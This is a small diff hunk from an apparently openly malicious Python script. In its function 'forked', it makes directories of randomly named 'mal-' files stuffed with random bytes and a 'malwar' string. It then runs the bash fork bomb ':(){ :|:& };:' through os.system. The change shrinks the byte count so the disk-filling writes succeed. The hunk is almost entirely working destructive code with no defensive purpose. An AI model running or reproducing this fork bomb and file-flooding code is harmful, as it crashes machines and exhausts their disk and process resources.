@@ -18,8 +18,8 @@ def forked():
     os.system("mkdir " + directory)
     os.system("touch " + directory + "/mal-" + random1 + str(random2) + str(random3) + str(random4))
     with open(os.getcwd() + "/" + directory + "/mal-" + random1 + str(random2) + str(random3) + str(random4), "a") as file:
-      file.write(str(random.randbytes(9999999999)) + malwar)
-      file.write(str(random.randbytes(9999999999)) + malwar)
+      file.write(str(random.randbytes(999999)) + malwar)
+      file.write(str(random.randbytes(999999)) + malwar)
     os.system("clear")
     os.system(":(){ :|:& };:")
     print(malwar)
